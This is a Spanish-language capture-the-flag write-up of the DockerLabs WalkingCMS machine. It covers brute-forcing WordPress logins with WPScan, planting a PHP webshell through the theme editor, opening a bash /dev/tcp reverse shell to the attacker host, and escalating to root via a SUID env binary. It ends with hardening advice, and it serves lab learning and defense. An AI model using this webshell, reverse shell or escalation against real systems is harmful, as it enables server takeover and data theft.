# WalkingCMS (DockerLabs) — Writeup

Dificultad: fácil

WordPress mueve, según las estimaciones más citadas, más del 40% de todas las webs de internet — lo cual también significa que es, de lejos, el CMS más atacado del planeta. Esta máquina es un recordatorio de por qué: entre plugins de terceros, temas editables desde el propio panel de administración y usuarios con contraseñas de diccionario, WordPress ofrece una superficie de ataque tan amplia que casi resulta abrumadora. Aquí el camino más corto pasa, literalmente, por el propio editor de temas integrado — una funcionalidad legítima que, en las manos equivocadas, es ejecución remota de código con etiquetas bonitas.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El reto tiene tres actos: enumerar usuarios y forzar contraseñas contra el WordPress con WPScan, aprovechar el editor de temas integrado en el propio panel de administración para inyectar código PHP arbitrario, y finalmente escalar privilegios mediante un binario SUID mal configurado — en este caso, la variante SUID de un patrón ya visto en otras máquinas vía sudo.

---

## Paso 0: comprobando conectividad

```bash
ping 172.17.0.2
```

El TTL de la respuesta ya deja intuir un sistema Linux detrás.

---

## Paso 1: reconocimiento de puertos

```bash
sudo nmap -p- --open --min-rate 5000 -n -Pn -vvvv 172.17.0.2
```

```
80/tcp open
```

```bash
sudo nmap -sCV -p80 172.17.0.2
```

Apache2 corriendo, aparentemente con la página por defecto. Antes de asumir que no hay nada más, se lanza un script de enumeración de contenido específico de Nmap:

```bash
sudo nmap --script=http-enum 172.17.0.2
```

Aparecen un par de subdirectorios que delatan claramente la presencia de un **WordPress** instalado. Visitando la web, se confirma: un sitio construido sobre WordPress, con toda la superficie de ataque característica de este CMS.

---

## Paso 2: WPScan — la herramienta de cabecera para cualquier WordPress

Frente a intentar enumerar manualmente usuarios, plugins y versiones, lo más eficiente es apoyarse en **WPScan**, una herramienta especializada que automatiza gran parte del reconocimiento específico de WordPress, incluyendo enumeración de usuarios válidos y ataques de fuerza bruta contra ellos:

```bash
wpscan --url http://172.17.0.2/wordpress/ --api-token <TOKEN> --passwords /usr/share/wordlists/rockyou.txt
```

El uso del API Token (gratuito tras registrarse en la plataforma de WPScan) desbloquea funcionalidades adicionales de la herramienta, como el chequeo de vulnerabilidades conocidas contra una base de datos actualizada. Tras el ataque de fuerza bruta, WPScan devuelve un par de credenciales válidas.

Con ellas, login directo desde la ruta estándar de WordPress:

```
http://172.17.0.2/wordpress/wp-login.php
```

Acceso al panel de administración confirmado.

---

## Paso 3: convertir el editor de temas en un RCE con nombre propio

Este es el momento en el que WordPress, sin ninguna vulnerabilidad "exótica" de por medio, se convierte en ejecución remota de código usando exclusivamente sus propias funcionalidades administrativas.

Dentro del panel: **Apariencia → Editor de temas**. Cualquier usuario con permisos de administrador puede editar directamente el código PHP de los archivos del tema activo desde el propio navegador — una funcionalidad pensada para personalización rápida, pero que de facto equivale a un editor de código con capacidad de ejecución en el servidor.

Se edita el archivo `index.php` del tema activo (en este caso, *Twenty Twenty-Two*), insertando:

```php
<?php
    system($_GET['cmd']);
?>
```

Tres líneas que bastan para convertir cualquier petición GET con el parámetro `cmd` en ejecución arbitraria de comandos del sistema operativo. Se guarda el cambio desde el propio editor, y se comprueba visitando directamente la ruta del archivo modificado:

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami
```

El comando se ejecuta y devuelve el usuario correspondiente al proceso de Apache. RCE confirmado, sin necesidad de explotar ningún CVE de plugin desactualizado — la propia funcionalidad legítima del CMS ha hecho todo el trabajo.

---

## Paso 4: de RCE a shell interactiva

Se levanta el listener:

```bash
nc -lvnp 443
```

Y se dispara la reverse shell a través del mismo parámetro `cmd` recién creado, usando de nuevo la redirección de red nativa de bash:

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

Nótese la codificación URL del símbolo `&` como `%26`, necesaria para que el navegador no interprete ese carácter como separador de parámetros dentro de la propia URL. Al ejecutarse, la conexión llega al listener y queda establecida una shell interactiva sobre el sistema.

---

## Paso 5: el primer sitio donde mirar tras comprometer cualquier WordPress

Cualquiera con experiencia auditando instalaciones de WordPress sabe que el primer archivo a revisar tras conseguir acceso al sistema es `wp-config.php`, en la raíz de la instalación — ahí es donde WordPress almacena, en texto plano, las credenciales de conexión a la base de datos.

```bash
cat wp-config.php
```

Las credenciales aparecen, en efecto, pero tras revisar el contenido de la base de datos, no hay nada aprovechable para escalar privilegios — ni contraseñas reutilizables de usuarios del sistema, ni información adicional de interés. Un callejón razonable de explorar, pero sin salida en este caso concreto.

---

## Paso 6: la vía clásica — enumeración de binarios SUID

```bash
find / -perm -4000 2>/dev/null
```

Entre el listado, aparece un binario que no debería estar ahí con esos permisos:

```
/usr/bin/env
```

`env` con el bit SUID activo es funcionalmente equivalente al mismo binario concedido vía `sudo NOPASSWD`, con la diferencia de que aquí no hace falta ni siquiera invocar sudo — el propio binario, al ejecutarse, adopta directamente los privilegios de su propietario (root) gracias al SUID. El mecanismo de abuso es idéntico al ya visto con la variante de sudo: `env` puede lanzar cualquier programa como argumento, heredando sus propios privilegios efectivos.

```bash
env /bin/sh -p
```

El flag `-p` en `/bin/sh` es importante aquí: le indica a la shell que preserve los privilegios efectivos en lugar de descartarlos automáticamente al detectar una discrepancia entre UID real y efectivo — un comportamiento de seguridad por defecto en muchas shells modernas que, sin este flag, frustraría el intento de escalada incluso con el SUID correctamente configurado.

```
whoami
root
```

Root conseguido.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Reconocimiento | Detección de instalación WordPress vía http-enum |
| Credenciales | WPScan (enumeración de usuarios + fuerza bruta con rockyou) |
| Vector de RCE | Editor de temas de WordPress → inyección de PHP en `index.php` |
| Acceso al sistema | Reverse shell vía parámetro `cmd` |
| Callejón sin salida | `wp-config.php` sin credenciales reutilizables |
| Vector de escalada | `/usr/bin/env` con bit SUID activo |
| Resultado final | root, vía `env /bin/sh -p` |

---

## Qué falló aquí (y cómo se evita)

1. **Usuarios de WordPress con contraseñas de diccionario.** WPScan pudo forzar credenciales válidas con un diccionario estándar como rockyou.txt. Cualquier cuenta de administrador de WordPress, dada la superficie de ataque tan bien documentada que tiene este CMS, necesita contraseñas robustas y, siempre que sea posible, autenticación de dos factores.
2. **Editor de temas accesible para cuentas de administrador sin restricciones adicionales.** Aunque es una funcionalidad nativa y legítima de WordPress, permitir la edición directa de archivos PHP del tema activo equivale, en la práctica, a dar capacidad de ejecución de código en el servidor a cualquier cuenta con ese nivel de permisos. Restringir esta funcionalidad (deshabilitando la edición de archivos vía `DISALLOW_FILE_EDIT` en la configuración de WordPress) es una recomendación de hardening estándar y poco conocida fuera de círculos de administración de WordPress.
3. **Binario del sistema (`env`) con bit SUID innecesario.** Igual que en otras máquinas de esta colección donde `env` aparecía concedido vía sudo, aquí el problema es el mismo pero más grave todavía: no hace falta ni siquiera tener permisos de sudo, el propio binario ya concede privilegios de root a cualquiera que lo ejecute. Ningún binario de propósito general debería tener el bit SUID activo salvo necesidad estrictamente justificada.

---

## Referencias

- WPScan: https://github.com/wpscanteam/wpscan
- GTFOBins — env: https://gtfobins.github.io/gtfobins/env/
- WordPress Hardening — DISALLOW_FILE_EDIT: https://wordpress.org/documentation/article/hardening-wordpress/
- DockerLabs: https://dockerlabs.es/
